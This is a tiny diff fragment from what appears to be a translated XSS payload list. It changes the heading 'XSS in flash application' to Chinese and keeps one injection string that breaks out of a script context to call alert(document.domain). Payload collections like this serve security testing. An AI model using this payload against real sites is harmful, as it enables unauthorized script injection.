@@ -1,4 +1,4 @@
-XSS in flash application
+flash应用中的XSS
 ```
  \%22})))}catch(e){alert(document.domain);}// 
 
